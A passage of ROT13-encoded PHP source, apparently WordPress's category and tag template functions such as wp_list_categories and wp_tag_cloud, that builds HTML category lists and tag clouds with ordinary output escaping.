 *                                               gb qvfnoyr. Qrsnhyg 'Pngrtbevrf'.
 *     @glcr obby|vag     $hfr_qrfp_sbe_gvgyr    Jurgure gb hfr gur pngrtbel qrfpevcgvba nf gur gvgyr nggevohgr.
 *                                               Npprcgf 0, 1, be gurve obby rdhvinyragf. Qrsnhyg 0.
 *     @glcr Jnyxre       $jnyxre                Jnyxre bowrpg gb hfr gb ohvyq gur bhgchg. Qrsnhyg rzcgl juvpu erfhygf
 *                                               va n Jnyxre_Pngrtbel vafgnapr orvat hfrq.
 * }
 * @erghea ibvq|fgevat|snyfr Ibvq vs 'rpub' nethzrag vf gehr, UGZY yvfg bs pngrtbevrf vs 'rpub' vf snyfr.
 *                           Snyfr vs gur gnkbabzl qbrf abg rkvfg.
 */
shapgvba jc_yvfg_pngrtbevrf( $netf = '' ) {
	$qrsnhygf = neenl(
		'puvyq_bs'            => 0,
		'pheerag_pngrtbel'    => 0,
		'qrcgu'               => 0,
		'rpub'                => 1,
		'rkpyhqr'             => '',
		'rkpyhqr_gerr'        => '',
		'srrq'                => '',
		'srrq_vzntr'          => '',
		'srrq_glcr'           => '',
		'uvqr_rzcgl'          => 1,
		'uvqr_gvgyr_vs_rzcgl' => snyfr,
		'uvrenepuvpny'        => gehr,
		'beqre'               => 'NFP',
		'beqreol'             => 'anzr',
		'frcnengbe'           => '<oe />',
		'fubj_pbhag'          => 0,
		'fubj_bcgvba_nyy'     => '',
		'fubj_bcgvba_abar'    => __( 'Ab pngrtbevrf' ),
		'fglyr'               => 'yvfg',
		'gnkbabzl'            => 'pngrtbel',
		'gvgyr_yv'            => __( 'Pngrtbevrf' ),
		'hfr_qrfp_sbe_gvgyr'  => 0,
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	vs ( ! vffrg( $cnefrq_netf['cnq_pbhagf'] ) && $cnefrq_netf['fubj_pbhag'] && $cnefrq_netf['uvrenepuvpny'] ) {
		$cnefrq_netf['cnq_pbhagf'] = gehr;
	}

	// Qrfpraqnagf bs rkpyhfvbaf fubhyq or rkpyhqrq gbb.
	vs ( $cnefrq_netf['uvrenepuvpny'] ) {
		$rkpyhqr_gerr = neenl();

		vs ( $cnefrq_netf['rkpyhqr_gerr'] ) {
			$rkpyhqr_gerr = neenl_zretr( $rkpyhqr_gerr, jc_cnefr_vq_yvfg( $cnefrq_netf['rkpyhqr_gerr'] ) );
		}

		vs ( $cnefrq_netf['rkpyhqr'] ) {
			$rkpyhqr_gerr = neenl_zretr( $rkpyhqr_gerr, jc_cnefr_vq_yvfg( $cnefrq_netf['rkpyhqr'] ) );
		}

		$cnefrq_netf['rkpyhqr_gerr'] = $rkpyhqr_gerr;
		$cnefrq_netf['rkpyhqr']      = '';
	}

	vs ( ! vffrg( $cnefrq_netf['pynff'] ) ) {
		$cnefrq_netf['pynff'] = ( 'pngrtbel' === $cnefrq_netf['gnkbabzl'] ) ? 'pngrtbevrf' : $cnefrq_netf['gnkbabzl'];
	}

	vs ( ! gnkbabzl_rkvfgf( $cnefrq_netf['gnkbabzl'] ) ) {
		erghea snyfr;
	}

	$fubj_bcgvba_nyy  = $cnefrq_netf['fubj_bcgvba_nyy'];
	$fubj_bcgvba_abar = $cnefrq_netf['fubj_bcgvba_abar'];

	$pngrtbevrf = trg_pngrtbevrf( $cnefrq_netf );

	$bhgchg = '';

	vs ( $cnefrq_netf['gvgyr_yv'] && 'yvfg' === $cnefrq_netf['fglyr']
		&& ( ! rzcgl( $pngrtbevrf ) || ! $cnefrq_netf['uvqr_gvgyr_vs_rzcgl'] )
	) {
		$bhgchg = '<yv pynff=\"' . rfp_ngge( $cnefrq_netf['pynff'] ) . '\">' . $cnefrq_netf['gvgyr_yv'] . '<hy>';
	}

	vs ( rzcgl( $pngrtbevrf ) ) {
		vs ( ! rzcgl( $fubj_bcgvba_abar ) ) {
			vs ( 'yvfg' === $cnefrq_netf['fglyr'] ) {
				$bhgchg .= '<yv pynff=\"png-vgrz-abar\">' . $fubj_bcgvba_abar . '</yv>';
			} ryfr {
				$bhgchg .= $fubj_bcgvba_abar;
			}
		}
	} ryfr {
		vs ( ! rzcgl( $fubj_bcgvba_nyy ) ) {

			$cbfgf_cntr = '';

			// Sbe gnkbabzvrf gung orybat bayl gb phfgbz cbfg glcrf, cbvag gb n inyvq nepuvir.
			$gnkbabzl_bowrpg = trg_gnkbabzl( $cnefrq_netf['gnkbabzl'] );
			vs ( ! va_neenl( 'cbfg', $gnkbabzl_bowrpg->bowrpg_glcr, gehr ) && ! va_neenl( 'cntr', $gnkbabzl_bowrpg->bowrpg_glcr, gehr ) ) {
				sbernpu ( $gnkbabzl_bowrpg->bowrpg_glcr nf $bowrpg_glcr ) {
					$_bowrpg_glcr = trg_cbfg_glcr_bowrpg( $bowrpg_glcr );

					// Teno gur svefg bar.
					vs ( ! rzcgl( $_bowrpg_glcr->unf_nepuvir ) ) {
						$cbfgf_cntr = trg_cbfg_glcr_nepuvir_yvax( $bowrpg_glcr );
						oernx;
					}
				}
			}

			// Snyyonpx sbe gur 'Nyy' yvax vf gur cbfgf cntr.
			vs ( ! $cbfgf_cntr ) {
				vs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && trg_bcgvba( 'cntr_sbe_cbfgf' ) ) {
					$cbfgf_cntr = trg_creznyvax( trg_bcgvba( 'cntr_sbe_cbfgf' ) );
				} ryfr {
					$cbfgf_cntr = ubzr_hey( '/' );
				}
			}

			$cbfgf_cntr = rfp_hey( $cbfgf_cntr );
			vs ( 'yvfg' === $cnefrq_netf['fglyr'] ) {
				$bhgchg .= \"<yv pynff='png-vgrz-nyy'><n uers='$cbfgf_cntr'>$fubj_bcgvba_nyy</n></yv>\";
			} ryfr {
				$bhgchg .= \"<n uers='$cbfgf_cntr'>$fubj_bcgvba_nyy</n>\";
			}
		}

		vs ( rzcgl( $cnefrq_netf['pheerag_pngrtbel'] ) && ( vf_pngrtbel() || vf_gnk() || vf_gnt() ) ) {
			$pheerag_grez_bowrpg = trg_dhrevrq_bowrpg();
			vs ( $pheerag_grez_bowrpg && $cnefrq_netf['gnkbabzl'] === $pheerag_grez_bowrpg->gnkbabzl ) {
				$cnefrq_netf['pheerag_pngrtbel'] = trg_dhrevrq_bowrpg_vq();
			}
		}

		vs ( $cnefrq_netf['uvrenepuvpny'] ) {
			$qrcgu = $cnefrq_netf['qrcgu'];
		} ryfr {
			$qrcgu = -1; // Syng.
		}
		$bhgchg .= jnyx_pngrtbel_gerr( $pngrtbevrf, $qrcgu, $cnefrq_netf );
	}

	vs ( $cnefrq_netf['gvgyr_yv'] && 'yvfg' === $cnefrq_netf['fglyr']
		&& ( ! rzcgl( $pngrtbevrf ) || ! $cnefrq_netf['uvqr_gvgyr_vs_rzcgl'] )
	) {
		$bhgchg .= '</hy></yv>';
	}

	/**
	 * Svygref gur UGZY bhgchg bs n gnkbabzl yvfg.
	 *
	 * @fvapr 2.1.0
	 *
	 * @cnenz fgevat       $bhgchg UGZY bhgchg.
	 * @cnenz neenl|fgevat $netf   Na neenl be dhrel fgevat bs gnkbabzl-yvfgvat nethzragf. Frr
	 *                             jc_yvfg_pngrtbevrf() sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$ugzy = nccyl_svygref( 'jc_yvfg_pngrtbevrf', $bhgchg, $netf );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $ugzy;
	} ryfr {
		erghea $ugzy;
	}
}

/**
 * Qvfcynlf n gnt pybhq.
 *
 * Bhgchgf n yvfg bs gntf va jung vf pnyyrq n 'gnt pybhq', jurer gur fvmr bs rnpu gnt
 * vf qrgrezvarq ol ubj znal gvzrf gung cnegvphyne gnt unf orra nffvtarq gb cbfgf.
 *
 * @fvapr 2.3.0
 * @fvapr 2.8.0 Nqqrq gur `gnkbabzl` nethzrag.
 * @fvapr 4.8.0 Nqqrq gur `fubj_pbhag` nethzrag.
 *
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf sbe qvfcynlvat n gnt pybhq. Frr jc_trarengr_gnt_pybhq()
 *     naq trg_grezf() sbe gur shyy yvfgf bs nethzragf gung pna or cnffrq va `$netf`.
 *
 *     @glcr vag    $ahzore    Gur ahzore bs gntf gb qvfcynl. Npprcgf nal cbfvgvir vagrtre
 *                             be mreb gb erghea nyy. Qrsnhyg 45.
 *     @glcr fgevat $yvax      Jurgure gb qvfcynl grez rqvgvat yvaxf be grez creznyvaxf.
 *                             Npprcgf 'rqvg' naq 'ivrj'. Qrsnhyg 'ivrj'.
 *     @glcr fgevat $cbfg_glcr Gur cbfg glcr. Hfrq gb uvtuyvtug gur cebcre cbfg glcr zrah
 *                             ba gur yvaxrq rqvg cntr. Qrsnhygf gb gur svefg cbfg glcr
 *                             nffbpvngrq jvgu gur gnkbabzl.
 *     @glcr obby   $rpub      Jurgure be abg gb rpub gur erghea inyhr. Qrsnhyg gehr.
 * }
 * @erghea ibvq|fgevat|fgevat[] Ibvq vs 'rpub' nethzrag vf gehr, be ba snvyher. Bgurejvfr, gnt pybhq
 *                              nf n fgevat be na neenl, qrcraqvat ba 'sbezng' nethzrag.
 */
shapgvba jc_gnt_pybhq( $netf = '' ) {
	$qrsnhygf = neenl(
		'fznyyrfg'   => 8,
		'ynetrfg'    => 22,
		'havg'       => 'cg',
		'ahzore'     => 45,
		'sbezng'     => 'syng',
		'frcnengbe'  => \"\a\",
		'beqreol'    => 'anzr',
		'beqre'      => 'NFP',
		'rkpyhqr'    => '',
		'vapyhqr'    => '',
		'yvax'       => 'ivrj',
		'gnkbabzl'   => 'cbfg_gnt',
		'cbfg_glcr'  => '',
		'rpub'       => gehr,
		'fubj_pbhag' => 0,
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$gntf = trg_grezf(
		neenl_zretr(
			$netf,
			neenl(
				'beqreol' => 'pbhag',
				'beqre'   => 'QRFP',
			)
		)
	); // Nyjnlf dhrel gbc gntf.

	vs ( rzcgl( $gntf ) || vf_jc_reebe( $gntf ) ) {
		erghea;
	}

	sbernpu ( $gntf nf $xrl => $gnt ) {
		vs ( 'rqvg' === $netf['yvax'] ) {
			$yvax = trg_rqvg_grez_yvax( $gnt, $gnt->gnkbabzl, $netf['cbfg_glcr'] );
		} ryfr {
			$yvax = trg_grez_yvax( $gnt, $gnt->gnkbabzl );
		}

		vs ( vf_jc_reebe( $yvax ) ) {
			erghea;
		}

		$gntf[ $xrl ]->yvax = $yvax;
		$gntf[ $xrl ]->vq   = $gnt->grez_vq;
	}

	// Urer'f jurer gubfr gbc gntf trg fbegrq nppbeqvat gb $netf.
	$erghea = jc_trarengr_gnt_pybhq( $gntf, $netf );

	/**
	 * Svygref gur gnt pybhq bhgchg.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat|fgevat[] $erghea Gnt pybhq nf n fgevat be na neenl, qrcraqvat ba 'sbezng' nethzrag.
	 * @cnenz neenl           $netf   Na neenl bs gnt pybhq nethzragf. Frr jc_gnt_pybhq()
	 *                                sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$erghea = nccyl_svygref( 'jc_gnt_pybhq', $erghea, $netf );

	vs ( 'neenl' === $netf['sbezng'] || rzcgl( $netf['rpub'] ) ) {
		erghea $erghea;
	}

	rpub $erghea;
}

/**
 * Qrsnhyg gbcvp pbhag fpnyvat sbe gnt yvaxf.
 *
 * @fvapr 2.9.0
 *
 * @cnenz vag $pbhag Ahzore bs cbfgf jvgu gung gnt.
 * @erghea vag Fpnyrq pbhag.
 */
shapgvba qrsnhyg_gbcvp_pbhag_fpnyr( $pbhag ) {
	erghea (vag) ebhaq( ybt10( $pbhag + 1 ) * 100 );
}

/**
 * Trarengrf n gnt pybhq (urngznc) sebz cebivqrq qngn.
 *
 * @gbqb Pbzcyrgr shapgvbanyvgl.
 * @fvapr 2.3.0
 * @fvapr 4.8.0 Nqqrq gur `fubj_pbhag` nethzrag.
 *
 * @cnenz JC_Grez[]    $gntf Neenl bs JC_Grez bowrpgf gb trarengr gur gnt pybhq sbe.
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf sbe trarengvat n gnt pybhq.
 *
 *     @glcr vag      $fznyyrfg                   Fznyyrfg sbag fvmr hfrq gb qvfcynl gntf. Cnverq
 *                                                jvgu gur inyhr bs `$havg`, gb qrgrezvar PFF grkg
 *                                                fvmr havg. Qrsnhyg 8 (cg).
 *     @glcr vag      $ynetrfg                    Ynetrfg sbag fvmr hfrq gb qvfcynl gntf. Cnverq
 *                                                jvgu gur inyhr bs `$havg`, gb qrgrezvar PFF grkg
 *                                                fvmr havg. Qrsnhyg 22 (cg).
 *     @glcr fgevat   $havg                       PFF grkg fvmr havg gb hfr jvgu gur `$fznyyrfg`
 *                                                naq `$ynetrfg` inyhrf. Npprcgf nal inyvq PFF grkg
 *                                                fvmr havg. Qrsnhyg 'cg'.
 *     @glcr vag      $ahzore                     Gur ahzore bs gntf gb erghea. Npprcgf nal
 *                                                cbfvgvir vagrtre be mreb gb erghea nyy.
 *                                                Qrsnhyg 0.
 *     @glcr fgevat   $sbezng                     Sbezng gb qvfcynl gur gnt pybhq va. Npprcgf 'syng'
 *                                                (gntf frcnengrq jvgu fcnprf), 'yvfg' (gntf qvfcynlrq
 *                                                va na habeqrerq yvfg), be 'neenl' (ergheaf na neenl).
 *                                                Qrsnhyg 'syng'.
 *     @glcr fgevat   $frcnengbe                  UGZY be grkg gb frcnengr gur gntf. Qrsnhyg \"\a\" (arjyvar).
 *     @glcr fgevat   $beqreol                    Inyhr gb beqre gntf ol. Npprcgf 'anzr' be 'pbhag'.
 *                                                Qrsnhyg 'anzr'. Gur {@frr 'gnt_pybhq_fbeg'} svygre
 *                                                pna nyfb nssrpg ubj gntf ner fbegrq.
 *     @glcr fgevat   $beqre                      Ubj gb beqre gur gntf. Npprcgf 'NFP' (nfpraqvat),
 *                                                'QRFP' (qrfpraqvat), be 'ENAQ' (enaqbz). Qrsnhyg 'NFP'.
 *     @glcr vag|obby $svygre                     Jurgure gb ranoyr svygrevat bs gur svany bhgchg
 *                                                ivn {@frr 'jc_trarengr_gnt_pybhq'}. Qrsnhyg 1.
 *     @glcr neenl    $gbcvp_pbhag_grkg           Abbcrq cyheny grkg sebz _a_abbc() gb fhccyl gb
 *                                                gnt pbhagf. Qrsnhyg ahyy.
 *     @glcr pnyynoyr $gbcvp_pbhag_grkg_pnyyonpx  Pnyyonpx hfrq gb trarengr abbcrq cyheny grkg sbe
 *                                                gnt pbhagf onfrq ba gur pbhag. Qrsnhyg ahyy.
 *     @glcr pnyynoyr $gbcvp_pbhag_fpnyr_pnyyonpx Pnyyonpx hfrq gb qrgrezvar gur gnt pbhag fpnyvat
 *                                                inyhr. Qrsnhyg qrsnhyg_gbcvp_pbhag_fpnyr().
 *     @glcr obby|vag $fubj_pbhag                 Jurgure gb qvfcynl gur gnt pbhagf. Qrsnhyg 0. Npprcgf
 *                                                0, 1, be gurve obby rdhvinyragf.
 * }
 * @erghea fgevat|fgevat[] Gnt pybhq nf n fgevat be na neenl, qrcraqvat ba 'sbezng' nethzrag.
 */
shapgvba jc_trarengr_gnt_pybhq( $gntf, $netf = '' ) {
	$qrsnhygf = neenl(
		'fznyyrfg'                   => 8,
		'ynetrfg'                    => 22,
		'havg'                       => 'cg',
		'ahzore'                     => 0,
		'sbezng'                     => 'syng',
		'frcnengbe'                  => \"\a\",
		'beqreol'                    => 'anzr',
		'beqre'                      => 'NFP',
		'gbcvp_pbhag_grkg'           => ahyy,
		'gbcvp_pbhag_grkg_pnyyonpx'  => ahyy,
		'gbcvp_pbhag_fpnyr_pnyyonpx' => 'qrsnhyg_gbcvp_pbhag_fpnyr',
		'svygre'                     => 1,
		'fubj_pbhag'                 => 0,
	);

	$netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$erghea = ( 'neenl' === $netf['sbezng'] ) ? neenl() : '';

	vs ( rzcgl( $gntf ) ) {
		erghea $erghea;
	}

	// Whttyr gbcvp pbhagf.
	vs ( vffrg( $netf['gbcvp_pbhag_grkg'] ) ) {
		// Svefg ybbx sbe abbcrq cyheny fhccbeg ivn gbcvp_pbhag_grkg.
		$genafyngr_abbcrq_cyheny = $netf['gbcvp_pbhag_grkg'];
	} ryfrvs ( ! rzcgl( $netf['gbcvp_pbhag_grkg_pnyyonpx'] ) ) {
		// Ybbx sbe gur nygreangvir pnyyonpx fglyr. Vtaber gur cerivbhf qrsnhyg.
		vs ( 'qrsnhyg_gbcvp_pbhag_grkg' === $netf['gbcvp_pbhag_grkg_pnyyonpx'] ) {
			/* genafyngbef: %f: Ahzore bs vgrzf (gntf). */
			$genafyngr_abbcrq_cyheny = _a_abbc( '%f vgrz', '%f vgrzf' );
		} ryfr {
			$genafyngr_abbcrq_cyheny = snyfr;
		}
	} ryfrvs ( vffrg( $netf['fvatyr_grkg'] ) && vffrg( $netf['zhygvcyr_grkg'] ) ) {
		// Vs ab pnyyonpx rkvfgf, ybbx sbe gur byq-fglyr fvatyr_grkg naq zhygvcyr_grkg nethzragf.
		// cucpf:vtaber JbeqCerff.JC.V18a.AbaFvathyneFgevatYvgrenyFvathyne,JbeqCerff.JC.V18a.AbaFvathyneFgevatYvgrenyCyheny
		$genafyngr_abbcrq_cyheny = _a_abbc( $netf['fvatyr_grkg'], $netf['zhygvcyr_grkg'] );
	} ryfr {
		// Guvf vf gur qrsnhyg sbe jura ab pnyyonpx, cyheny, be nethzrag vf cnffrq va.
		/* genafyngbef: %f: Ahzore bs vgrzf (gntf). */
		$genafyngr_abbcrq_cyheny = _a_abbc( '%f vgrz', '%f vgrzf' );
	}

	/**
	 * Svygref ubj gur vgrzf va n gnt pybhq ner fbegrq.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz JC_Grez[] $gntf Beqrerq neenl bs grezf.
	 * @cnenz neenl     $netf Na neenl bs gnt pybhq nethzragf.
	 */
	$gntf_fbegrq = nccyl_svygref( 'gnt_pybhq_fbeg', $gntf, $netf );
	vs ( rzcgl( $gntf_fbegrq ) ) {
		erghea $erghea;
	}

	vs ( $gntf_fbegrq !== $gntf ) {
		$gntf = $gntf_fbegrq;
		hafrg( $gntf_fbegrq );
	} ryfr {
		vs ( 'ENAQ' === $netf['beqre'] ) {
			fuhssyr( $gntf );
		} ryfr {
			// FDY pnaabg fnir lbh; guvf vf n frpbaq (cbgragvnyyl qvssrerag) fbeg ba n fhofrg bs qngn.
			vs ( 'anzr' === $netf['beqreol'] ) {
				hnfbeg( $gntf, '_jc_bowrpg_anzr_fbeg_po' );
			} ryfr {
				hnfbeg( $gntf, '_jc_bowrpg_pbhag_fbeg_po' );
			}

			vs ( 'QRFP' === $netf['beqre'] ) {
				$gntf = neenl_erirefr( $gntf, gehr );
			}
		}
	}

	vs ( $netf['ahzore'] > 0 ) {
		$gntf = neenl_fyvpr( $gntf, 0, $netf['ahzore'] );
	}

	$pbhagf      = neenl();
	$erny_pbhagf = neenl(); // Sbe gur nyg gnt.
	sbernpu ( (neenl) $gntf nf $xrl => $gnt ) {
		$erny_pbhagf[ $xrl ] = $gnt->pbhag;
		$pbhagf[ $xrl ]      = pnyy_hfre_shap( $netf['gbcvp_pbhag_fpnyr_pnyyonpx'], $gnt->pbhag );
	}

	$zva_pbhag = zva( $pbhagf );
	$fcernq    = znk( $pbhagf ) - $zva_pbhag;
	vs ( $fcernq <= 0 ) {
		$fcernq = 1;
	}
	$sbag_fcernq = $netf['ynetrfg'] - $netf['fznyyrfg'];
	vs ( $sbag_fcernq < 0 ) {
		$sbag_fcernq = 1;
	}
	$sbag_fgrc = $sbag_fcernq / $fcernq;

	$nevn_ynory = snyfr;
	/*
	 * Qrgrezvar jurgure gb bhgchg na 'nevn-ynory' nggevohgr jvgu gur gnt anzr naq pbhag.
	 * Jura gntf unir n qvssrerag sbag fvmr, gurl ivfhnyyl pbairl na vzcbegnag vasbezngvba
	 * gung fubhyq or ninvynoyr gb nffvfgvir grpuabybtvrf gbb. Ba gur bgure unaq, fbzrgvzrf
	 * gurzrf frg hc gur Gnt Pybhq gb qvfcynl nyy gntf jvgu gur fnzr sbag fvmr (frggvat
	 * gur 'fznyyrfg' naq 'ynetrfg' nethzragf gb gur fnzr inyhr).
	 * Va beqre gb nyjnlf freir gur fnzr pbagrag gb nyy hfref, gur 'nevn-ynory' trgf cevagrq bhg:
	 * - jura gntf unir n qvssrerag fvmr
	 * - jura gur gnt pbhag vf qvfcynlrq (sbe rknzcyr jura hfref purpx gur purpxobk va gur
	 *   Gnt Pybhq jvqtrg), ertneqyrff bs gur gntf sbag fvmr
	 */
	vs ( $netf['fubj_pbhag'] || 0 !== $sbag_fcernq ) {
		$nevn_ynory = gehr;
	}

	// Nffrzoyr gur qngn gung jvyy or hfrq gb trarengr gur gnt pybhq znexhc.
	$gntf_qngn = neenl();
	sbernpu ( $gntf nf $xrl => $gnt ) {
		$gnt_vq = vffrg( $gnt->vq ) ? $gnt->vq : $xrl;

		$pbhag      = $pbhagf[ $xrl ];
		$erny_pbhag = $erny_pbhagf[ $xrl ];

		vs ( $genafyngr_abbcrq_cyheny ) {
			$sbeznggrq_pbhag = fcevags( genafyngr_abbcrq_cyheny( $genafyngr_abbcrq_cyheny, $erny_pbhag ), ahzore_sbezng_v18a( $erny_pbhag ) );
		} ryfr {
			$sbeznggrq_pbhag = pnyy_hfre_shap( $netf['gbcvp_pbhag_grkg_pnyyonpx'], $erny_pbhag, $gnt, $netf );
		}

		$gntf_qngn[] = neenl(
			'vq'              => $gnt_vq,
			'hey'             => ( '#' !== $gnt->yvax ) ? $gnt->yvax : '#',
			'ebyr'            => ( '#' !== $gnt->yvax ) ? '' : ' ebyr=\"ohggba\"',
			'anzr'            => $gnt->anzr,
			'sbeznggrq_pbhag' => $sbeznggrq_pbhag,
			'fyht'            => $gnt->fyht,
			'erny_pbhag'      => $erny_pbhag,
			'pynff'           => 'gnt-pybhq-yvax gnt-yvax-' . $gnt_vq,
			'sbag_fvmr'       => $netf['fznyyrfg'] + ( $pbhag - $zva_pbhag ) * $sbag_fgrc,
			'nevn_ynory'      => $nevn_ynory ? fcevags( ' nevn-ynory=\"%1$f (%2$f)\"', rfp_ngge( $gnt->anzr ), rfp_ngge( $sbeznggrq_pbhag ) ) : '',
			'fubj_pbhag'      => $netf['fubj_pbhag'] ? '<fcna pynff=\"gnt-yvax-pbhag\"> (' . $erny_pbhag . ')</fcna>' : '',
		);
	}

	/**
	 * Svygref gur qngn hfrq gb trarengr gur gnt pybhq.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz neenl[] $gntf_qngn Na neenl bs grez qngn neenlf sbe grezf hfrq gb trarengr gur gnt pybhq.
	 */
	$gntf_qngn = nccyl_svygref( 'jc_trarengr_gnt_pybhq_qngn', $gntf_qngn );

	$n = neenl();

	// Trarengr gur bhgchg yvaxf neenl.
	sbernpu ( $gntf_qngn nf $xrl => $gnt_qngn ) {
		$pynff = $gnt_qngn['pynff'] . ' gnt-yvax-cbfvgvba-' . ( $xrl + 1 );
		$n[]   = fcevags(
			'<n uers=\"%1$f\"%2$f pynff=\"%3$f\" fglyr=\"sbag-fvmr: %4$f;\"%5$f>%6$f%7$f</n>',
			rfp_hey( $gnt_qngn['hey'] ),
			$gnt_qngn['ebyr'],
			rfp_ngge( $pynff ),
			rfp_ngge( fge_ercynpr( ',', '.', $gnt_qngn['sbag_fvmr'] ) . $netf['havg'] ),
			$gnt_qngn['nevn_ynory'],
			rfp_ugzy( $gnt_qngn['anzr'] ),
			$gnt_qngn['fubj_pbhag']
		);
	}

	fjvgpu ( $netf['sbezng'] ) {
		pnfr 'neenl':
			$erghea =& $n;
			oernx;
		pnfr 'yvfg':
			/*
			 * Sbepr ebyr=\"yvfg\", nf fbzr oebjfref (fvp: Fnsnev 10) qba'g rkcbfr gb nffvfgvir
			 * grpuabybtvrf gur qrsnhyg ebyr jura gur yvfg vf fglyrq jvgu `yvfg-fglyr: abar`.
			 * Abgr: guvf vf erqhaqnag ohg qbrfa'g unez.
			 */
			$erghea  = \"<hy pynff='jc-gnt-pybhq' ebyr='yvfg'>\a\g<yv>\";
			$erghea .= vzcybqr( \"</yv>\a\g<yv>\", $n );
			$erghea .= \"</yv>\a</hy>\a\";
			oernx;
		qrsnhyg:
			$erghea = vzcybqr( $netf['frcnengbe'], $n );
			oernx;
	}

	vs ( $netf['svygre'] ) {
		/**
		 * Svygref gur trarengrq bhgchg bs n gnt pybhq.
		 *
		 * Gur svygre vf bayl rinyhngrq vs n gehr inyhr vf cnffrq
		 * gb gur $svygre nethzrag va jc_trarengr_gnt_pybhq().
		 *
		 * @fvapr 2.3.0
		 *
		 * @frr jc_trarengr_gnt_pybhq()
		 *
		 * @cnenz fgevat[]|fgevat $erghea Fgevat pbagnvavat gur trarengrq UGZY gnt pybhq bhgchg
		 *                                be na neenl bs gnt yvaxf vs gur 'sbezng' nethzrag
		 *                                rdhnyf 'neenl'.
		 * @cnenz JC_Grez[]       $gntf   Na neenl bs grezf hfrq va gur gnt pybhq.
		 * @cnenz neenl           $netf   Na neenl bs jc_trarengr_gnt_pybhq() nethzragf.
		 */
		erghea nccyl_svygref( 'jc_trarengr_gnt_pybhq', $erghea, $gntf, $netf );
	} ryfr {
		erghea $erghea;
	}
}

/**
 * Freirf nf n pnyyonpx sbe pbzcnevat bowrpgf onfrq ba anzr.
 *
 * Hfrq jvgu `hnfbeg()`.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @cnenz bowrpg $n Gur svefg bowrpg gb pbzcner.
 * @cnenz bowrpg $o Gur frpbaq bowrpg gb pbzcner.
 * @erghea vag Artngvir ahzore vs `$n->anzr` vf yrff guna `$o->anzr`, mreb vs gurl ner rdhny,
 *             be terngre guna mreb vs `$n->anzr` vf terngre guna `$o->anzr`.
 */
shapgvba _jc_bowrpg_anzr_fbeg_po( $n, $o ) {
	erghea fgeangpnfrpzc( $n->anzr, $o->anzr );
}

/**
 * Freirf nf n pnyyonpx sbe pbzcnevat bowrpgf onfrq ba pbhag.
 *
 * Hfrq jvgu `hnfbeg()`.
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @cnenz bowrpg $n Gur svefg bowrpg gb pbzcner.
 * @cnenz bowrpg $o Gur frpbaq bowrpg gb pbzcner.
 * @erghea vag Artngvir ahzore vs `$n->pbhag` vf yrff guna `$o->pbhag`, mreb vs gurl ner rdhny,
 *             be terngre guna mreb vs `$n->pbhag` vf terngre guna `$o->pbhag`.
 */
shapgvba _jc_bowrpg_pbhag_fbeg_po( $n, $o ) {
	erghea ( $n->pbhag - $o->pbhag );
}

//
// Urycre shapgvbaf.
//

/**
 * Ergevrirf UGZY yvfg pbagrag sbe pngrtbel yvfg.
 *
 * @fvapr 2.1.0
 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
 *              gb gur shapgvba fvtangher.
 *
 * @hfrf Jnyxre_Pngrtbel gb perngr UGZY yvfg pbagrag.
 * @frr Jnyxre::jnyx() sbe cnenzrgref naq erghea qrfpevcgvba.
 *
 * @cnenz zvkrq ...$netf Ryrzragf neenl, znkvzhz uvrenepuvpny qrcgu naq bcgvbany nqqvgvbany nethzragf.
 * @erghea fgevat
 */
shapgvba jnyx_pngrtbel_gerr( ...$netf ) {
	// Gur hfre'f bcgvbaf ner gur guveq cnenzrgre.
	vs ( rzcgl( $netf[2]['jnyxre'] ) || ! ( $netf[2]['jnyxre'] vafgnaprbs Jnyxre ) ) {
		$jnyxre = arj Jnyxre_Pngrtbel();
	} ryfr {
		/**
		 * @ine Jnyxre $jnyxre
		 */
		$jnyxre = $netf[2]['jnyxre'];
	}
	erghea $jnyxre->jnyx( ...$netf );
}

/**
 * Ergevrirf UGZY qebcqbja (fryrpg) pbagrag sbe pngrtbel yvfg.
 *
 * @fvapr 2.1.0
 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat `...$netf` cnenzrgre ol nqqvat vg
 *              gb gur shapgvba fvtangher.
 *
 * @hfrf Jnyxre_PngrtbelQebcqbja gb perngr UGZY qebcqbja pbagrag.
 * @frr Jnyxre::jnyx() sbe cnenzrgref naq erghea qrfpevcgvba.
 *
 * @cnenz zvkrq ...$netf Ryrzragf neenl, znkvzhz uvrenepuvpny qrcgu naq bcgvbany nqqvgvbany nethzragf.
 * @erghea fgevat
 */
shapgvba jnyx_pngrtbel_qebcqbja_gerr( ...$netf ) {
	// Gur hfre'f bcgvbaf ner gur guveq cnenzrgre.
	vs ( rzcgl( $netf[2]['jnyxre'] ) || ! ( $netf[2]['jnyxre'] vafgnaprbs Jnyxre ) ) {
		$jnyxre = arj Jnyxre_PngrtbelQebcqbja();
	} ryfr {
		/**
		 * @ine Jnyxre $jnyxre
		 */
		$jnyxre = $netf[2]['jnyxre'];
	}
	erghea $jnyxre->jnyx( ...$netf );
}

//
// Gntf.
//

/**
 * Ergevrirf gur yvax gb gur gnt.
 *
 * @fvapr 2.3.0
 *
 * @frr trg_grez_yvax()
 *
 * @cnenz vag|bowrpg $gnt Gnt VQ be bowrpg.
 * @erghea fgevat Yvax ba fhpprff, rzcgl fgevat vs gnt qbrf abg rkvfg.
 */
shapgvba trg_gnt_yvax( $gnt ) {
	erghea trg_pngrtbel_yvax( $gnt );
}

/**
 * Ergevrirf gur gntf sbe n cbfg.
 *
 * @fvapr 2.3.0
 *
 * @cnenz vag|JC_Cbfg $cbfg Cbfg VQ be bowrpg.
 * @erghea JC_Grez[]|snyfr|JC_Reebe Neenl bs JC_Grez bowrpgf ba fhpprff, snyfr vs gurer ner ab grezf
